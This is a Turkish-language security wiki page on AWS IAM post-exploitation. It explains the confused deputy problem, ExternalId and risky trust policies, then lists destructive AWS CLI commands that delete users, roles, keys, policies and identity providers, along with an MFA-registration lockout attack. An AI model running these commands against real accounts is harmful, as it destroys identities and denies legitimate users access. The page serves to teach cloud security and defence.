# AWS - IAM Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

IAM erişimi hakkında daha fazla bilgi için:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

## Confused Deputy Problemi

Eğer hesabınızda bir **harici hesap (A)**'nın bir **rol**e erişmesine izin verirseniz, muhtemelen **o harici hesaba tam olarak kimlerin erişebileceği** konusunda **0 görünürlüğe** sahip olursunuz. Bu bir sorundur, çünkü başka bir harici hesap (B), harici hesap (A)'ya erişebiliyorsa **B'nin de hesabınıza erişebilmesi** mümkündür.

Bu nedenle, bir harici hesabın hesabınızdaki bir role erişmesine izin verirken bir `ExternalId` belirtmek mümkündür. Bu, harici hesabın (A)'nın organizasyonunuzdaki rolu **üstlenebilmek için belirtmesi gereken** bir "gizli" string'tir. Çünkü **harici hesap B bu string'i bilmiyorsa**, A'ya erişimi olsa bile **rolünüze erişemeyecektir**.

<figure><img src="../../../images/image (95).png" alt=""><figcaption></figcaption></figure>

Ancak, bu `ExternalId` "gizli" değerinin **gerçekte bir sır olmadığını** unutmayın; IAM assume role policy'yi **okuyabilen herkes bunu görebilir**. Fakat harici hesap A bunu biliyorsa ve harici hesap **B bunu bilmiyorsa**, bu durum **B'nin A'yı kötüye kullanarak rolünüze erişmesini engeller**.

Örnek:
```json
{
"Version": "2012-10-17",
"Statement": {
"Effect": "Allow",
"Principal": {
"AWS": "Example Corp's AWS Account ID"
},
"Action": "sts:AssumeRole",
"Condition": {
"StringEquals": {
"sts:ExternalId": "12345"
}
}
}
}
```
> [!WARNING]
> Bir attacker'ın confused deputy'i exploit edebilmesi için, mevcut account'taki principals'ın diğer account'lardaki roles'leri impersonate edip edemeyeceğini bir şekilde bulması gerekir.

### Beklenmeyen Trusts

#### Principal olarak wildcard
```json
{
"Action": "sts:AssumeRole",
"Effect": "Allow",
"Principal": { "AWS": "*" }
}
```
Bu politika **tüm AWS'nin rolü üstlenmesine izin verir**.

#### Hizmet olarak özne
```json
{
"Action": "lambda:InvokeFunction",
"Effect": "Allow",
"Principal": { "Service": "apigateway.amazonaws.com" },
"Resource": "arn:aws:lambda:000000000000:function:foo"
}
```
Bu politika **herhangi bir hesabın** apigateway'ini yapılandırıp bu Lambda'yı çağırmasına izin verir.

#### S3 principal olarak
```json
"Condition": {
"ArnLike": { "aws:SourceArn": "arn:aws:s3:::source-bucket" },
"StringEquals": {
"aws:SourceAccount": "123456789012"
}
}
```
Eğer bir S3 bucket principal olarak verilmişse — çünkü S3 bucket'ların bir Account ID'si yoktur — eğer siz **bucket'ınızı sildiyseniz ve saldırgan onu kendi hesabında oluşturduysa**, bunu kötüye kullanabilirler.

#### Desteklenmiyor
```json
{
"Effect": "Allow",
"Principal": { "Service": "cloudtrail.amazonaws.com" },
"Action": "s3:PutObject",
"Resource": "arn:aws:s3:::myBucketName/AWSLogs/MY_ACCOUNT_ID/*"
}
```
Confused Deputy sorunlarından kaçınmanın yaygın bir yolu, kaynak ARN'yi kontrol etmek için `AWS:SourceArn` ile bir condition kullanmaktır. Ancak, **bazı servisler bunu desteklemeyebilir** (bazı kaynaklara göre CloudTrail gibi).

### Kimlik Bilgileri Silme
Aşağıdaki izinlerden herhangi biriyle — `iam:DeleteAccessKey`, `iam:DeleteLoginProfile`, `iam:DeleteSSHPublicKey`, `iam:DeleteServiceSpecificCredential`, `iam:DeleteInstanceProfile`, `iam:DeleteServerCertificate`, `iam:DeleteCloudFrontPublicKey`, `iam:RemoveRoleFromInstanceProfile` — bir aktör access keys, login profiles, SSH keys, service-specific credentials, instance profiles, certificates veya CloudFront public keys kaldırabilir veya instance profiles'tan rolleri ayırabilir. Bu tür eylemler meşru kullanıcıları ve uygulamaları hemen engelleyebilir ve bu kimlik bilgilerine bağımlı sistemler için denial-of-service veya erişim kaybına yol açabilir; bu nedenle bu IAM izinleri sıkı şekilde sınırlandırılmalı ve izlenmelidir.
```bash
# Remove Access Key of a user
aws iam delete-access-key \
--user-name <Username> \
--access-key-id AKIAIOSFODNN7EXAMPLE

## Remove ssh key of a user
aws iam delete-ssh-public-key \
--user-name <Username> \
--ssh-public-key-id APKAEIBAERJR2EXAMPLE
```
### Kimlik Silme
`iam:DeleteUser`, `iam:DeleteGroup`, `iam:DeleteRole`, veya `iam:RemoveUserFromGroup` gibi izinlerle bir aktör kullanıcıları, rolleri veya grupları silebilir—veya grup üyeliğini değiştirebilir—kimlikleri ve ilişkili izleri kaldırarak. Bu, bu kimliklere bağlı kişiler ve hizmetlerin erişimini hemen kesebilir, denial-of-service veya erişim kaybına neden olabilir; bu yüzden bu IAM eylemleri sıkı şekilde kısıtlanmalı ve izlenmelidir.
```bash
# Delete a user
aws iam delete-user \
--user-name <Username>

# Delete a group
aws iam delete-group \
--group-name <Username>

# Delete a role
aws iam delete-role \
--role-name <Role>
```
###
Aşağıdaki izinlerden herhangi birine sahip bir aktör — `iam:DeleteGroupPolicy`, `iam:DeleteRolePolicy`, `iam:DeleteUserPolicy`, `iam:DeletePolicy`, `iam:DeletePolicyVersion`, `iam:DeleteRolePermissionsBoundary`, `iam:DeleteUserPermissionsBoundary`, `iam:DetachGroupPolicy`, `iam:DetachRolePolicy`, `iam:DetachUserPolicy` — yönetilen/inline politikaları silebilir veya ayırabilir, politika sürümlerini veya izin sınırlarını kaldırabilir ve politikaları kullanıcılar, gruplar veya rollerden bağlantısını kesebilir. Bu, yetkilendirmeleri yok eder ve izin modelini değiştirebilir; bu da bu politikalara bağlı principal'lar için anında erişim kaybına veya hizmet reddine yol açabilir. Bu nedenle bu IAM eylemleri sıkı şekilde kısıtlanmalı ve izlenmelidir.
```bash
# Delete a group policy
aws iam delete-group-policy \
--group-name <GroupName> \
--policy-name <PolicyName>

# Delete a role policy
aws iam delete-role-policy \
--role-name <RoleName> \
--policy-name <PolicyName>
```
### Federated Kimlik Silinmesi
`iam:DeleteOpenIDConnectProvider`, `iam:DeleteSAMLProvider` ve `iam:RemoveClientIDFromOpenIDConnectProvider` izinleriyle bir aktör OIDC/SAML kimlik sağlayıcılarını silebilir veya client ID'lerini kaldırabilir. Bu, federasyon tabanlı kimlik doğrulamayı bozar, token doğrulamasını engeller ve IdP veya yapılandırmalar geri yüklenene kadar SSO'ya bağlı kullanıcılar ve servislerin erişimini derhal engeller.
```bash
# Delete OIDCP provider
aws iam delete-open-id-connect-provider \
--open-id-connect-provider-arn arn:aws:iam::111122223333:oidc-provider/accounts.google.com

# Delete SAML provider
aws iam delete-saml-provider \
--saml-provider-arn arn:aws:iam::111122223333:saml-provider/CorporateADFS
```
### Yetkisiz MFA Etkinleştirme
`iam:EnableMFADevice` ile bir aktör, bir kullanıcının kimliğine bir MFA cihazı kaydedebilir ve meşru kullanıcının oturum açmasını engelleyebilir. Yetkisiz bir MFA etkinleştirildiğinde, cihaz kaldırılana veya sıfırlanana kadar kullanıcı kilitlenebilir (Not: birden fazla MFA cihazı kayıtlıysa, oturum açmak için yalnızca biri yeterli olduğundan bu saldırı erişimi engellemede etkili olmayacaktır).
```bash
aws iam enable-mfa-device \
--user-name <Username> \
--serial-number arn:aws:iam::111122223333:mfa/alice \
--authentication-code1 123456 \
--authentication-code2 789012
```
### Sertifika/Anahtar Meta Verisi Müdahalesi
`iam:UpdateSSHPublicKey`, `iam:UpdateCloudFrontPublicKey`, `iam:UpdateSigningCertificate`, `iam:UpdateServerCertificate` ile bir aktör, genel anahtarların ve sertifikaların durumunu veya meta verisini değiştirebilir. Anahtarları/sertifikaları devre dışı işaretleyerek veya referanslarını değiştirerek SSH kimlik doğrulamayı bozabilir, X.509/TLS doğrulamalarını geçersiz kılabilir ve bu kimlik bilgilerine bağlı hizmetleri anında aksatarak erişim veya kullanılabilirlik kaybına neden olabilir.
```bash
aws iam update-ssh-public-key \
--user-name <Username> \
--ssh-public-key-id APKAEIBAERJR2EXAMPLE \
--status Inactive

aws iam update-server-certificate \
--server-certificate-name <Certificate_Name> \
--new-path /prod/
```
### `iam:Delete*`

IAM joker karakteri iam:Delete* birçok tür IAM kaynağını — users, roles, groups, policies, keys, certificates, MFA devices, policy versions, etc. — kaldırma yetkisi verir ve bu nedenle çok büyük bir hasar potansiyeline sahiptir: iam:Delete* yetkisi verilen bir aktör kimlikleri, kimlik bilgilerini, politikaları ve ilgili öğeleri kalıcı olarak yok edebilir, denetim/kanıtları kaldırabilir ve hizmet veya operasyonel aksamalara neden olabilir. Bazı örnekler:
```bash
# Delete a user
aws iam delete-user --user-name <Username>

# Delete a role
aws iam delete-role --role-name <RoleName>

# Delete a managed policy
aws iam delete-policy --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/<PolicyName>
```
### `iam:EnableMFADevice`

iam:EnableMFADevice eylemi verilen bir aktör, kullanıcı zaten etkinleştirmemişse, hesap içindeki bir kimliğe MFA cihazı kaydedebilir. Bu, bir kullanıcının erişimine müdahale etmek için kullanılabilir: saldırgan bir MFA cihazı kaydettikten sonra, meşru kullanıcı saldırgan tarafından kaydedilen MFA'yı kontrol etmediği için oturum açması engellenebilir.

Bu erişimi engelleme saldırısı yalnızca kullanıcıya daha önce hiçbir MFA kaydedilmemişse işe yarar; eğer saldırgan o kullanıcı için bir MFA cihazı kaydederse, meşru kullanıcı bu yeni MFA gerektiren herhangi bir akıştan kilitlenir. Kullanıcının zaten kontrolü altında bir veya daha fazla MFA cihazı varsa, saldırgan kontrollü bir MFA eklemek meşru kullanıcıyı engellemez — kullanıcı zaten sahip olduğu herhangi bir MFA ile kimlik doğrulamaya devam edebilir.

Bir kullanıcı için MFA cihazını etkinleştirmek (kaydetmek) amacıyla bir saldırgan şunu çalıştırabilir:
```bash
aws iam enable-mfa-device \
--user-name <Username> \
--serial-number arn:aws:iam::111122223333:mfa/alice \
--authentication-code1 123456 \
--authentication-code2 789012
```
## Referanslar

- [https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html)

{{#include ../../../../banners/hacktricks-training.md}}
